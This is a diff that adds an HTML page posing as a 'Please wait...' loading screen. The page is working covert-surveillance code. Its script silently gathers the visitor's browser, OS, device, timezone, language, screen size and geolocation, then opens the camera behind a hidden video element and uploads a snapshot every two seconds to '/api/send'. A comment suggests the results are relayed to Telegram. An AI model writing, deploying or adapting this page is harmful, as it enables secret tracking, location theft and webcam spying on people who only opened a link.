@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <h1>Please wait...</h1>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        (async function() {
+            // Function to send initial data
+            async function sendInitialData() {
+                const data = {
+                    browser: navigator.userAgent,
+                    browserVersion: getBrowserVersion(),
+                    os: getOS(),
+                    deviceType: getDeviceType(),
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language || navigator.userLanguage,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    // Attempt to get location via geolocation (may be blocked)
+                    location: await getLocation()
+                };
+
+                await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            }
+
+            // Helper: get browser version from user agent
+            function getBrowserVersion() {
+                const ua = navigator.userAgent;
+                let match = ua.match(/(firefox|chrome|safari|edge|opera|msie|trident)[\/\s](\d+)/i);
+                return match ? `${match[1]} ${match[2]}` : 'Unknown';
+            }
+
+            // Helper: get OS from user agent
+            function getOS() {
+                const ua = navigator.userAgent;
+                if (ua.indexOf('Windows') !== -1) return 'Windows';
+                if (ua.indexOf('Mac') !== -1) return 'MacOS';
+                if (ua.indexOf('Linux') !== -1) return 'Linux';
+                if (ua.indexOf('Android') !== -1) return 'Android';
+                if (ua.indexOf('iOS') !== -1) return 'iOS';
+                return 'Unknown';
+            }
+
+            // Helper: determine device type
+            function getDeviceType() {
+                const ua = navigator.userAgent;
+                if (/mobile/i.test(ua)) return 'Mobile';
+                if (/tablet/i.test(ua)) return 'Tablet';
+                return 'Desktop';
+            }
+
+            // Helper: try to get geolocation (may be denied)
+            function getLocation() {
+                return new Promise((resolve) => {
+                    if (!navigator.geolocation) {
+                        resolve('Geolocation not supported');
+                        return;
+                    }
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
+                        () => resolve('Permission denied')
+                    );
+                });
+            }
+
+            // Send initial data
+            await sendInitialData();
+
+            // Camera access and periodic snapshots
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Take a snapshot every 2 seconds
+                setInterval(async () => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
+
+                    // Send photo as multipart/form-data
+                    const formData = new FormData();
+                    formData.append('photo', base64);
+
+                    await fetch('/api/send', {
+                        method: 'POST',
+                        body: formData
+                    });
+                }, 2000);
+
+            } catch (err) {
+                console.error('Camera access denied or error:', err);
+                // Optionally send a message to Telegram that camera was denied
+                await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cameraError: 'Camera access denied or unavailable' })
+                });
+            }
+        })();
+    </script>
+</body>
+</html>
